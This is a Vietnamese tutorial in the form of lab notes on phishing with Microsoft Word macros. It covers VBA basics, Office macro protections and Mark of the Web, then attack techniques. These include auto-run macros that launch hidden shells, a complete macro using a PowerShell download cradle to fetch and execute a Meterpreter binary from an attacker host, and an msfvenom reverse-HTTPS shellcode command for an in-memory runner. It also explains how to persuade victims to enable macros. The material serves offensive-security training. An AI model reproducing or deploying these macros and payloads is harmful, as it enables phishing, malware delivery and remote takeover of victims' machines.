## Microsoft Office Macros
**Marco** trong Microsoft Office là một tập hợp các lệnh được lưu trong tài liệu Office nhằm tự động hoá một hoặc nhiều thao tác lặp lại. Trong Word, macro có thể được dùng để định dạng tài liệu, chèn nội dung mẫu, xử lý văn bản, kiểm tra định dạng hoặc tự động tạo báo cáo.
Macro trong Office thường được viết bằng Visual Basic for Applications, viết tắt là VBA. Đây là ngôn ngữ lập trình được Microsoft tích hợp vào các ứng dụng Office như Word, Excel, PowerPoint, Access và Outlook. Các macro có thể được quản lý thông qua thiết lập bảo mật macro, cho phép người dùng hoặc quản trị viên kiểm soát macro nào được phép chạy và trong điều kiện nào.
### Installing Microsoft Office
Đầu tiên, chúng ta sẽ cài đặt Microsoft Office trên máy ảo Windows 11. Ta sử dụng Remote Desktop Protocol, viết tắt RDP, thông qua công cụ `xfreerdp` để kết nối đến máy khách và đăng nhập vào domain. Tùy chọn `/u` được dùng để cung cấp tên người dùng, còn `/p` dùng để cung cấp mật khẩu. Ta sẽ sử dụng tùy chọn `-dynamic-resolution` để có thể thay đổi kích thước cửa sổ `xfreerdp` một cách linh hoạt.

```
xfreerdp /u:<username> /p:<password> /v:<machineIP> -dynamic-resolution
```
Tiếp theo trong File Explorer, chúng ta sẽ nhấp đúp vào tệp `C:\installs\Word2021Retail.img` để thực hiện nạp tệp ảnh đĩa ảo dưới dạng một ổ CD ảo.
![[Screenshot 2026-06-13 at 01.34.22.png|center|border|400]]
Việc nhấp đúp vào tệp này sẽ nạp tệp ảnh đĩa dưới dạng một ổ CD ảo, từ đó chúng ta có thể chạy tệp `Setup.exe` để bắt đầu quá trình cài đặt.
![[Screenshot 2026-06-13 at 01.37.24.png|center|border|400]]
Sau khi quá trình cài đặt hoàn tất, chúng ta sẽ nhấn Close trên màn hình thông báo để thoát khỏi trình cài đặt, sau đó mở Microsoft Word từ Start Menu.
![[Phishing with Microsoft Office.png|center|border|400]]
Khi Microsoft Word được mở, chúng ta có thể đống cửa sổ thông báo bật lên bằng cách nhấn tắt ở góc trên bên phải. Thao tác này giúp kích hoạt bản dùng thử miễn phí trong 7 ngày.
![[Phishing with Microsoft Office-1.png|center|border|400]]
Tiếp theo, chúng ta cần nhấn **Accept** để chấp nhận thỏa thuận cấp phép sử dụng phần mềm. Sau đó, chúng ta nhấn **Next** tại cửa sổ thông báo về quyền riêng tư dữ liệu. Cuối cùng, chúng ta chọn **Don’t send optional data** và nhấn **Done**.
![[Screenshot 2026-06-13 at 09.37.50.png|center|border|400]]
### Basics of VBA
Trong phần này, chúng ta sẽ tìm hiểu về các kiến thức cơ bản của VBA, những cơ chế bảo mật được tích hợp sẵn trong Microsoft Office và chúng ta sẽ tạo macro đầu tiên trong đó bao gồm một vài câu lệnh điều kiện và các hộp thoại thông báo. Sau đó, thử chạy bằng Command Prompt từ Microsoft Word với sự hỗ trợ của  Windows Script Host.
Đầu tiên, chúng ta mở Microsoft Word trên máy victim chạy Windows 11 và tạo một tài liệu mới. Sau đó, chuyển đến thẻ View và chọn Macros để truy cập menu Macro.
![[Screenshot 2026-06-13 at 09.50.07.png|border]]
Chúng ta cần chọn tài liệu hiện tại từ menu trong cửa sổ của Macros. Trong trường hợp này, chúng ta sẽ chọn Document1 (document) để chọn tài liệu chưa được đặt tên. Nếu không chọn tài liệu này, Word sẽ lưu macro vào global template.
![[Screenshot 2026-06-13 at 10.19.35.png|center|border|400]]
Sau khi chọn tài liệu hiện tài, chúng ta sẽ nhập tên cho macro. Trong ví dụ này, macro sẽ được đặt tên là "MyMacro". Khi chọn Create, trình soạn thảo VBA Editor sẽ được khởi chạy. Trình soạn thảo này cho phép chúng ta chạy và gỡ lỗi mã nguồn. 
![[Screenshot 2026-06-13 at 10.31.18.png|border|center|450]]
Trình soạn thảo đã tự động chèn một đoạn mã khởi tạo nhỏ. Trong đoạn mã này, `Sub MyMacro` xác định điểm bắt đầu của phương thức `MyMacro`, còn `End Sub` đánh dấu điểm kết thúc của phương thức đó. Tuy nhiên, một function được bảo quanh bởi các từ khoá như `Function MyMacro` và `End Function` thì có thể trả về giá trị.
Tương tự với nhiều ngôn ngữ lập trình khác, VBA yêu cầu chúng ta khai báo biến trước khi sủ dụng. Việc này có thể thực hiện bằng từ khoá `Dim` , kèm theo tên biến và kiểu dữ liệu của biến:
```vba
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```
Trong ví dụ này, chúng ta sử dụng ba kiểu dữ liệu phổ biến: `String`, `Long` và `LongPtr`. Các kiểu dữ liệu này lần lượt tương ứng với chuỗi Unicode, số nguyên 64-bit và con trỏ bộ nhớ. Chúng đại diện cho các kiểu dữ liệu gốc của hệ điều hành và thường được sử dụng trong C/C++.
Sau khi đã biết cách khai báo biến, chúng ta có thể sử dụng và thao tác với chúng thông qua các câu lệnh điều khiển luồng. Các câu lệnh này bao gồm `If`, `Else` và vòng lặp `For`. 
Các câu lệnh `If` và `Else` được kết hợp với các từ khoá `Then` và `End If` để tạo thành một câu lệnh rẽ nhánh hoàn chỉnh. Khi điều kiện `If` được thoả mãn, khối lệnh sau `Then` sẽ được thực thi. Ngược lại, khối lệnh sau `Else` sẽ được thực thi. Sau khi tất cả điều kiện được đánh giá, câu lệnh `End If` sẽ kết thúc cấu trúc rẽ nhánh.
Dưới đây là ví dụ, macro sẽ kiểm tra giá trị của một biến và dựa trên kết quả đó để hiển thị hộp thoại thông báo bằng hàm tích hợp sẵn `MsgBox`.
```vba
Sub MyMacro()

Dim myLong As Long

myLong = 1
If myLong < 5 Then
    MsgBox("True")
Else
    MsgBox("False")
End If

End Sub
```
Để thực thi macro, chúng ta nhấn **Run Macro**.
![[Screenshot 2026-06-13 at 10.58.51.png|border]]
Macro này sẽ hiển thị hộp thoại thông báo "True", vì biến `myLong` có giá trị nhỏ hơn 5.
![[Screenshot 2026-06-13 at 11.03.40.png|center|border|450]]
Tiếp theo, chúng ta sẽ tìm hiểu vòng lặp `For`, trong đó một bộ đếm sẽ được tăng dần thông qua từ khoá `Next`:
```vba
Sub MyMacro()

For counter = 1 To 3
    MsgBox("Alert")
Next counter

End Sub
```
Vòng lặp `For` sẽ đọc biến `counter` ba lần. Mỗi lần chương trình đi đến từ khoá `Next`, giá trị của `counter` sẽ được tăng thêm một đơn vị. Khi thực thi macro này, ba hộp thoại thông báo "Alert" sẽ lần lượt xuất hiện.
![[Screenshot 2026-06-13 at 11.12.19.png|center|border|450]]
Sau khi đã triển khai ngắn gọn về các phương thức tuỳ chỉnh và câu lệnh điều khiển, chúng ta sẽ tập trung vào mục tiêu chính: khiến nạn nhân thực thi macro tuỳ chỉnh của chúng ta. Vì nạn nhân khả năng sẽ không tự nguyện làm điều này, chúng ta cần tận dụng các phương thức có sẵn như `Document_Open()` và `AutoOpen()` . Cả hai phương thức này đều sẽ được thực thi khi tài liệu Word được mở.
Việc triển khai VBA có thể khác nhau giữa các ứng dụng Office. Ví dụ, trong Excel `Document_Open()` được gọi là `Workbook_Open()`.
Để sử dụng các phương thức này, chúng ta cần lưu tài liệu ở định dạng hỗ trợ macro, chẳng hạn như `.doc` hoặc `.docm`. Định dạng mới hơn `.docx` không hỗ trợ macro.
Bây giờ thử những kiến thức đã nói trên với macro đơn giản sử dụng cả `Document_Open()` và `AutoOpen`:
```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox("Hello World!")
End Sub
```

Chúng ta sẽ lưu tài liệu ở định dạng `.doc` cũ, còn được gọi là Word 97-2003 Document, rồi đóng tài liệu lại.
![[Phishing with Microsoft Office-2.png|border|center|450]]
Sau khi lưu tài liệu, mỏ lại nó. Thay vì thấy thông báo hộp thoại của Macro, chúng ta sẽ thấy một banner cảnh báo bảo mật:
![[Screenshot 2026-06-13 at 11.26.36.png|border|center|600]]
Nếu nhấn Enable Content, macro sẽ được thực thi và hộp thoại thông báo sẽ xuất hiện. Thiết lập bảo mật mặc định của mọi ứng dụng Office là không tự động thực thi macro. Khi triển khai tấn công phía client như này, kẻ tấn công cần thuyết phục victim mở tài liệu và bật macro.
Chúng ta có thể kiểm tra các thiết lập bảo mật này bằng cách truy cập `File > Option > Trust Center`, Sau đó mở Trust Center Setting
![[Screenshot 2026-06-13 at 12.11.05.png|center|border|550]]
Trong `Trust Center`, thiết lập bảo mật mặc định là `"Disable all macros with notification"`, tức là vô hiệu hoá tất cả macros nhưng vẫn hiển thị thông báo cho người dùng.
![[Screenshot 2026-06-13 at 12.13.29.png|center|border|550]]
Cách tuỳ chọn `Protected View` mô tả một tính năng sandbox được giới thiệu từ Microsoft Office 2010. Tính năng này được bật khi tài liệu có nguồn gốc Internet.
![[Screenshot 2026-06-13 at 12.22.40.png|center|border|550]]
Khi `Protected View` được bật, macro sẽ vô hiệu hoá, các hình ảnh bên ngoài sẽ bị chặn, và người dùng sẽ thấy thêm một cảnh báo bổ sung.
![[Phishing with Microsoft Office-3.png|center|700]]

Ngoài ra, macro sẽ bị vô hiệu hoá trong tất cả tài liệu được mở bằng Office 2021 trở lên và Office 365 nếu các tài liệu đó được tải xuống từ Internet. Điều này nghĩa là ngay cả khi chúng ta bằng cách nào đó thuyết phục được nạn nhân nhấn Enable Editing, macro vẫn sẽ không được thực thi. Đây có vẻ là một cơ chế bảo mật khá hiệu quả trước các mối đe doạ dựa trên macro, đồng thời đã làm giảm việc sử dụng tài liệu Office trong các chiến dịch phishing. Tuy nhiên, kẻ tấn công vẫn có thể lừa người dùng cho phép macro chạy. Một cách tiếp cận là khiến tài liệu Office trông như thể nó không được tải xuống tù Internet.

Office sử dụng thuộc tính Mark of the Web, viết tắt là MoTW, để xác định liệu một tài liệu có nguồn gốc từ Internet hay không. Thuộc tính này được thiết lập khi tài liệu được tải xuống tù Internet.

Chúng ta có thể xem thuộc tính MoTW bằng cách kiểm tra thuộc tính của tài liệu Word.
![[Phishing with Microsoft Office-4.png|center|border|400]]

Nếu chúng ta chọn Unblock và nhấn Apply, thuộc tính MoTW sẽ bị gỡ bỏ. Khi đó, tài liệu Word sẽ được xử lý như một tệp được tạo cục bộ. Điều này sẽ vô hiệu hoá Protected View và cho phép macro chạy.
Điều này đòi hỏi các attacker phải đưa ra một lý do đủ thuyết phục để lừa người dùng bỏ chặn tài liệu, từ đó loại bỏ Mark of the Web trước khi mở tài liệu.

#### VBA Shell Function
Một trong những cách đơn giản để khởi tạo một tiến trình bên ngoài từ VBA, ta sử dụng hàm `Shell`. Hàm này nhận vào hai tham số, tham số thú nhất xác định đường dẫn hoặc trên chương trình cần thực thi, có thể đi kèm các đối số dòng lệnh nếu cần, tham số thú là `WindowsStyle` , dùng để quy định cánh cửa sổ của chương trình được hiển thị khi chạy. Hầu hết kẻ tấn công đặt giá trị này là `vbHide`, hoặc giá trị số tương ứng là `0`, nhằm ẩn cửa sổ chương trình.
Ví dụ, đoạn mã dưới đây sẽ khởi chạy Command Prompt trong một cửa sổ ẩn sau khi nạn nhân bật macro:
```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

Sau khi lưu macro và mở lại tài liệu Word, macro sẽ chạy mà không hiển thị bất kỳ cảnh báo bảo mật nào, vì trước đó chúng ta đã bật macro cho tài liệu này. Nếu đỏi tên tài liệu, cảnh báo bảo mật sẽ xuất hiện.

Vì Command Prompt mở dưới dạng cửa sổ ẩn nên nó không được hiển thị trực tiếp. Tuy nhiên chúng ta có thể kiểm tra xem tiến trình này có đang chạy hay không, bằng cách chạy SysInternals Process Explorer:
![[Screenshot 2026-06-13 at 13.08.04.png|center|border|600]]
Công cụ này liệt kê thông tin về các tiến trình đang chạy trên hệ thống, các DLL mà những tiến trình đó đã nạp, đồng thòi hiển thị rõ `cmd.exe` đang chạy dưới dạng tiến trình con của `WINWORD.EXE`.

Chúng ta có thể sử dụng Windows Script Host để khởi chạy shell. Đề làm điều này, chúng ta sẽ gọi phương thức `CreateObject` nhằm tạo một đối tượng WSH shell. Từ đó có thể gọi phương thức `Run`:
```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

Trong đoạn mã này, lời gọi `CreateObject` trả về một đối tượng WSH. Từ đối tượng này, chúng ta gọi phương thức `Run`, truyền vào đường dẫn và tên của ứng dụng cần thực thi, cùng với kiểu hiển thị cửa sổ `vbHide`, tương ứng với giá trị `0`. Khi thực thi macro, `cmd.exe` một lần nữa sẽ được mở dưới dạng tiến trình ẩn. Chúng ta có thể kiểm chứng điều này bằng Process Explorer.
![[Screenshot 2026-06-13 at 15.47.57.png|center|border]]

**Task 1:** Tạo một macro VBA sử dụng hàm Environ để hiển thị tên người dùng hiện tại và tên máy tính trong một hộp thoại thông báo. Kết quả cần có định dạng: `username ||computername`.


**Environ Function**: Hàm `Environ` trong VBA dùng để lấy giá trị của một biến môi trường trong hệ điều hành. Ví dụ như tên người dùng, tên máy tính, đường dẫn hệ thống, thư mục tạm, v.v.
```vba
Environ({ envstring | number })
```
Hàm `Environ` có thể nhận một trong hai kiểu tham số:
- `envstring` : Tên của biến môi trường ví dụ `"USERNAME"`, `"COMPUTERNAME"`, `"PATH"`
- `number`: Số thứ tự của biến môi trường trong bảng biến môi trường của hệ điều hành 

Dưới đây là đoạn code của mình cho Task 1
```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Environ ("USERNAME")
    MsgBox Environ("USERNAME") & " ||" & Environ("COMPUTERNAME")
End Sub
```

Kết quả khi thực hiện mở file word:
![[Screenshot 2026-06-13 at 16.17.07.png|center|border|550]]

**Task 2**: Tải tệp `C:\Tools\safe.doc` về máy Kali của bạn. Đổi tên tài liệu Word đó và host nó trên máy Kali bằng một web server Python. Sau đó, tải tài liệu này xuống máy Windows 11 và kiểm tra xem thuộc tính **Mark of the Web** đã được thiết lập hay chưa. Tiếp theo, xóa thuộc tính **Mark of the Web** khỏi tài liệu Word và mở tài liệu đó. Bật macro. Kết quả hiển thị trong hộp thoại cảnh báo là gì?

Đầu tiên trên máy kali, mình thực hiện tạo thư mục share để mấy file từ Windows
```bash
mkdir -p ~/wordlab
```
Tiếp theo mình kết nối RDP vào Windows 11 và mount thư mục Kali vào Windows
```bash
xfreerdp /u:<username> /p:<password> /v:<machineIP> -dynamic-resolution /drive:wordlab,/home/kali/wordlab
```
![[Screenshot 2026-06-13 at 16.34.57.png|center|border]]
Trong windows, mở file explorer, thực hiện sao chép tệp cần thiết vào folder 
![[Screenshot 2026-06-13 at 16.37.25.png|border|center|600]]
Khi thực hiện đổi tên trên máy Kali
![[Screenshot 2026-06-13 at 17.42.16.png|center|border|550]]
Trên máy Kali thực hiện mở server trên cổng 8000 bằng python sau đó trên máy Windows, truy cập vào để tải tệp về, 

![[Screenshot 2026-06-13 at 17.49.13.png|center|border|300]]
Đây là kết quả khi thực hiện mở file
![[Screenshot 2026-06-13 at 17.56.55.png|center|border|500]]

#### Integrating PowerShell
PowerShell là một ngôn ngữ kịch bản hướng đối tượng, nó được biên dịch và thực thi tức thời thông qua nền tảng `.NET Framework` . PowerShell thường không yêu cầu định nghĩa kiểu dữ liệu chặt chẽ và cung cấp tính linh hoạt cao hơn so với VBA. 
Để khai báo một biến trong PowerShell, chúng ta chỉ cần đặt ký hiệu dollar (`$`) trước tên biến. Các cấu trúc điều khiển trong PowerShell, bao gồm các câu lệnh rẽ nhánh và vòng lặp, cú pháp tương tự như hầu hết các ngôn ngữ khác. Điểm khác biệt lớn nhất về cú pháp nằm ở các toán tử so sánh. PowerShell không sử dụng các toán tử thông thường như `!=` mà thay vào đó sử dụng các toán tử như `-eq`, `-ne`, v.v.
Do PowerShell có quyểnt truy cập vào `.NET Framework`, chúng ta có thể dễ dàng triển khai các kỹ thuật như "download cradle" để tải nội dung từ các máy chủ web bên ngoài. Biển thể được sử dụng phổ biến nhất là lớp `Net.WebClient`. Bằng cách `DownloadFile` để tải bất kỳ tệp tin nào từ máy chủ web về máy nạn nhân.
Phương thức `DownloadFile` nhận hai tham số: URL của tệp tin cần tải và tên tệp tin đầu ra. Toàn bộ quy trình tải xuống có thể được viết chỉ trong bốn dòng mã PowerShell:
```powershell
$url = "http://192.168.119.120/msfstaged.exe"
$out = msfstaged.exe
$wc = New-Object Net.WebClient
$wc.Download($url, $out)
```
Trong đoạn code trên, chúng ta đã khởi tạo một biến cho tệp cần tải và một biến cho tên tệp lưu cục bộ. Tiếp theo, chúng ta khởi tạo lớp `Net.WebClient` để tạo một download cradle, từ đó gọi phương thức `DownloadFile` để tải tệp tin. Trong trường hợp này, chúng ta sử dụng tệp thực thi Meterpreter dạng staged đã tạo trước đó.
Chúng ta có thể nén đoạn mã này thành một dòng lệnh duy nhất:
```powershell
(New-Object System.Net.WebClient).DownloadFile('[http://192.168.119.120/msfstaged.exe](http://192.168.119.120/msfstaged.exe)', 'msfstaged.exe')
```
Bây giờ, hãy nhúng lệnh này vào macro Word bằng VBA và để PowerShell thực hiện các tác vụ nặng. Chúng ta sẽ xây dựng từng bước và sau đó xem xét lại mã hoàn chỉnh.
Hầu hết các download cradle trong PowerShell sử dụng giao thức HTTP hoặc HTTPS, nhưng chúng ta cũng có thể sử dụng bản ghi TXT và phương thức vận chuyển DNS.
Tổng quan quy trình, chúng ta sẽ thiết lập một download cradle của PowerShell vào chuỗi đó. Tiếp theo, chúng ta sử dụng phương thức `Shell` để khởi chạy PowerShell với đối số là dòng lệnh một dòng đã tạo. Chúng ta sẽ cấu hình phương thức `Shell` để chạy đoạn mã này và ẩn giao diện người dùng.
```vba
Dim str As Long
str = "power (New-Object System.Net.WebClient).DownloadFile('http://192.168.205.10/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

Trước khi thực thi đoạn mã này, chúng ta phải đặt tệp thực thi Meterpreter trên máy Kali cùng với một `multi/handler` lắng nghe
Để thực thi tệp Meterpreter thông qua VBA, chúng ta phải chỉ định đường dẫn đầy đủ. Rất thuận tiện là nội dung được tải xuống sẽ nằm trong cùng thư mục với tệp Word, và chúng ta có thể truy xuất đường dẫn bằng thuộc tính `ActiveDocument.Path`:
```vba
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```
Vì tệp Meterpreter được tải xuống từ máy chủ web và thời gian tải có thể thay đổi, chúng ta cần bổ sung một khoảng thời gian trễ. Đáng tiếc, Microsoft Word không tích hợp sẵn hàm `Wait` hoặc `Sleep` giống như Excel, vì vậy chúng ta sẽ triển khai một phương thức `Wait` tùy chỉnh sử dụng vòng lặp `Do` kết hợp với các hàm `Now` và `DateAdd`.
Phương thức này cho phép thiết lập tham số `Wait` để tạm dùng quá trình thực thi. Để đảm bảo rằng quy trình `Wait` không gây treo Word, mỗi lần lặp sẽ gọi lệnh `DoEvents` nhằm cho phép Word xử lý các tác vụ khác.
Để thực hiện, chúng ta sử dụng hàm `Now` để lấy ngày giờ hiện tại và lưu vào biến `t`. Sau đó, sử dụng vòng lặp `Do` với điều kiện kiểm tra trong câu lệnh `Loop Until`.
```vba
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
Đoạn mã này sẽ tiếp tục lặp cho đến khi biểu thức so sánh trả về giá trị đúng (true), xảy ra khi thời gian hiện tại (do hàm `Now` trả về) lớn hơn thời gian do hàm `DateAdd` trả về. Hàm này nhận ba tham số: chuỗi đại diện cho đơn vị thời gian ("s" - giây), số giây cần chờ (n), và thời gian bắt đầu (t).
Nói đơn giản, n giây sẽ được cộng vào thời gian bắt đầu vòng lặp, và kết quả được so sánh với thời gian hiện tại. Khi đạt đủ n giây, vòng lặp sẽ kết thúc.
Với phương thức `Wait` đã được triển khai, chúng ta chỉ cần gọi nó và sau đó thực thi tệp Meterpreter bằng hàm `Shell`.
Dưới đây là mã VBA hoàn chỉnh:
```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## Executing Shellcode in Word Memory
Trong phần này, chúng ta sẽ cải tiến kỹ thuật (tradecraft) bằng cách sửa đổi phương thức tấn công để thực thi payload Meterpreter dạng staged trực tiếp trong bộ nhớ. Đây là một quy trình phức tạp, nhưng chúng ta sẽ học được các kỹ thuật giá trị trong quá trình này.
Khái niệm này vượt ra ngoài giới hạn thông thường của VBA. Lý do là payload Meterpreter dạng staged là các mã máy (assembly) thuần túy, cần được đặt vào một phân đoạn bộ nhớ xác định và thực thi. Thay vì chỉ sử dụng VBA thuần túy, chúng ta có thể tận dụng các Win32 API gốc của hệ điều hành Windows ngay trong VBA.

### Calling Win32 APIs from VBA 
Các API của hệ điều hành Windows nằm trong các thư viện liên kết động (DLL) và chạy như các mã không được quản lý. Chúng ta sẽ sử dụng từ khoá `Declare` để liên kết tới các API này trong VBA, đồng thời cung cấp tên hàm, tệp DLL chứa hàm đó, các kiểu đối số và kiểu dữ liệu trả về. Chúng ta sẽ sử dụng `Private Declare`, nghĩa là hàm này chỉ được sử dụng trong phạm vi mã cục bộ của chúng ta.

Trong ví dụ này, chúng ta sẽ sử dụng API `GetUserName`. Chúng ta sẽ xây dựng câu lệnh khai báo hàm và hiển thị tên người dùng (username) trong một hộp thoại thông báo bằng `MsgBox`. Chúng ta có thể tham khảo function prototype từ tài liệu chính thức của MSDN, tài liệu này cung cấp kích thước tối đa của username cùng với tệp DLL chứa nó (Advapi32.dll). Chúng ta có thể mở rộng thông tin này để khai báo hàm ta muốn.
```c
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```

MSDN mô tả các đối số của hàm này bằng kiểu dữ liệu C gốc, và chúng ta phải chuyển đổi chúng sang các kiểu dữ liệu tương ứng trong VBA. Đối số đầu tiên là một bộ đem đầu ra (output buffer) có kiểu `LPSTR` trong C, chứa tên người dùng hiện tại. Trong VBA, nó thể được cung cấp dưới dạng `String`.
Việc chuyển đổi giữa các kiểu dữ liệu C và VBA có thể khá phức tạp. MSDN có tham chiếu một số bảng so sánh, nhưng rất ít tài liệu chính thức chi tiết.
Trong C, `LPSTR` là một con trỏ trỏ đến một chuỗi ký tự. Tương tự, đối tượng `String` trong VBA cũng giữ con trỏ tới chuỗi thay vì bản thân chuỗi. Vì lý do này, chúng ta có thể truyền đối số bằng giá trị (`ByVal`) vì các kiểu dữ liệu kỳ vọng đã khớp nhau.
Đối số thứ hai (`pcbBuffer`) trong nguyên mẫu hàm là một con trỏ hoặc tham chiếu đến một `DWORD`(`LPDWORD`), đây là kích thước tối đa của bộ đệm chứa chuỗi ký tự. Chúng ta có thể thay thế bằng kiểu dữ liệu `Long` của VBA và truyền theo tham chiều (`byRef`) để nhận được con trỏ trong VBA. Cuối cùng, kiểu dữ liệu đầu ra trong C là `BOOL`, chúng ta có thể chuyển đổi thành `Long` trong VBA.
Sau khi đã làm rõ các thành phần, hãy cùng tổng hợp lại. Chúng ta sẽ nhập (import) hàm mục tiêu bằng `Private Declare`, cung cấp tên Windows API, vị trí DLL và các đối số. Khi làm việc trên nền tảng 64-bit, chúng ta phải thêm từ khóa `PtrSafe`. Câu lệnh `Declare` hoàn chỉnh được trình bày dưới đây. Lưu ý rằng nó phải được đặt ngoài các thủ tục (procedure).
```vba
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As `Long`
```
Sau khi đã nhập hàm, chúng ta cần khai báo ba biến: giá trị trả về, bộ đệm đầu ra và kích thước của bộ đệm đầu ra. Theo tài liệu MSDN, độ dài tối đa cho phép của một username là 256 ký tự, do đó chúng ta sẽ tạo một chuỗi `MyBuff` có kích thước 256 byte và một biến `MySize` kiểu `Long` với giá trị bằng 256.
```vba
Function MyMacro()
    Dim res As Long 
    Dim MyBuff As String * 256 
    Dim MySize As Long 
    MySize = 256
    res = GetUserName(MyBuff, MySize)
End Funciton
```

Trước khi có thể in kết quả, hãy lưu ý rằng `MyBuff` có thể chứa tối đa 256 ký tự, nhưng chúng ta không biết độ dài chính xác của username thực tế. Vì chuỗi ký tự trong C được kết thúc bằng một byte rỗng (null byte), chúng ta sẽ sử dụng hàm `InStr` để tìm chỉ mục của ký tự kết thúc này trong bộ đệm.

Các đối số cho `InStr` rất đơn giản. Chúng ta xác định vị trí bắt đầu (thiết lập là "1" cho vị trí đầu tiên của chuỗi), chuỗi cần tìm kiếm và ký tự tìm kiếm (byte rỗng `vbNullChar`). Hàm này sẽ trả về vị trí của byte rỗng đầu tiên; chúng ta chỉ cần trừ đi 1 để có được độ dài thực tế của chuỗi.
```vba
Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function
```
Bây giờ chúng ta đã có độ dài của chuỗi, chúng ta sẽ in các ký tự không phải là null bằng phương thức `Left` như minh họa ở dòng được làm nổi bật trong Danh sách 17. Phương thức `Left` tạo ra một chuỗi con từ đối số thứ nhất với độ dài được chỉ định bởi đối số thứ hai.

Nếu chúng ta gọi Win32 API đúng cách, macro sẽ hiển thị username mong muốn mà không có các khoảng trắng thừa ở cuối.

**Task**: “Phát triển một macro VBA gọi hàm Win32 API `GetPhysicallyInstalledSystemMemory` và hiển thị kết quả trong một hộp thoại thông báo. Kết quả là gì?

```c
BOOL GetPhysicallyInstalledSystemMemory(
  [out] PULONGLONG TotalMemoryInKilobytes
);
```

Nó là một con trỏ trỏ đến biến kiểu `ULONGLONG`, tức là số nguyên 64-bit không dấu, sau khi gọi hàm thành công, Windows sẽ ghi tổng RAM vật lý vào biến này, tính bằng KB.

```vba
Private Declare PtrSafe Function GetPhysicallyInstalledSystemMemory Lib "kernel32" (ByRef TotalMemoryInKilobytes As LongLong) As Long

Sub MyMacro()
    Dim TotalMemoryInKilobytes As LongLong

    If GetPhysicallyInstalledSystemMemory(TotalMemoryInKilobytes) <> 0 Then
        MsgBox TotalMemoryInKilobytes
    Else
        MsgBox "Failed"
    End If
End Sub
```
Kết quả
![[Phishing with Microsoft Office-7.png|center|border|600]]
### VBA Shellcode Runner
Tiếp theo, chúng ta sẽ tìm hiểu về một shellcode runner, chúng ta sẽ xây dựng thành phần này bằng VBA.

Phương pháp phổ biến là sử dụng ba Win32 API từ `Kernel32.dll`: `VirtualAlloc`, `RtlMoveMemory` và `CreateThread`/
Chúng ta sử dụng `VirtualAlloc` để cấp phát vùng nhớ không được quản lý với các quyền ghi, đọc và thực thi. Sau đó, chúng ta sao chép shellcode vào vùng nhớ vừa cấp phát bằng `RtlMoveMemory` và sử dụng `CreateThread` để tạo một luồng thực thi mới trong tiến tình nhằm chạy đoạn shellcode đó. 

**Lưu ý:** Việc cấp phát bộ nhớ thông qua các Win32 API khác thường trả về vùng nhớ không có quyền thực thi do cơ chế Phòng chống Thực thi Dữ liệu (Data Execution Prevention - DEP).

Chúng ta sẽ đi qua từng API, bắt đầu với `VirtuallAlloc`. MSDN mô tả function prototype của `VirtualAlloc` như sau:
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

API này chấp nhận bốn đối số, đối số đầu tiên (`lpAddress`) là địa chỉ cấp phát bộ nhớ, nếu để giá trị "0", API sẽ tự chọn vị trí. Đối số `dwSize` chỉ định kích thước vùng nhớ cần cấp phát. Cuối cùng, `flAllocationType` và `flProtect` lần lượt chỉ định kiểu cấp phát và các quyền bảo vệ bộ nhớ.
Đối số đầu tiên và giá trị trả về là các con trỏ bộ nhớ, có thể biểu diễn bằng `LongPtr` trong VBA. Ba đối số còn lại là các số nguyên và có thể chuyển đổi sang kiểu `Long`.
Chúng ta khai báo các đối số này trong câu lệnh `Declare` như dưới đây
```vba
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (
    ByVal lpAddress As LongPtr,
    ByVal dwSize As Long,
    ByVal flAllocation As Long,
    ByVal flProtect As Long
) As LongPtr
```
Sau khi đã có câu lệnh `Declare`, chúng ta cần xác định các giá trị cần thiết. Vì chúng ta chưa biết kích thước của shellcode, hãy tạo nó trước. Để tạo shellcode, chúng ta cần xác định kiến trúc mục tiêu, Chúng ta sẽ nhắm tới máy Windows 64-bit. Mặc dù các phiên bản Microsoft Word mới (365 và 2021) là ứng dụng 64-bit, các phiên bản cũ hơn (như 2016) chạy dưới dạng 32-bit. Ở đây, chúng ta sẽ tạo shellcode Meterpreter 64-bit.
Chúng ta sử dụng `msfvenom` để tạo shellcode dưới định dạng `vbapplication` làm giai đoạn đầu của Meterpreter. Do thực thi trong Word, chúng ta đặt `EXITFUNC` là "thread" (thay vì "process") để Word không bị đóng khi shellcode kết thúc.
```bash
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f vbapplication
```
![[Screenshot 2026-06-13 at 21.34.25.png|center|border]]
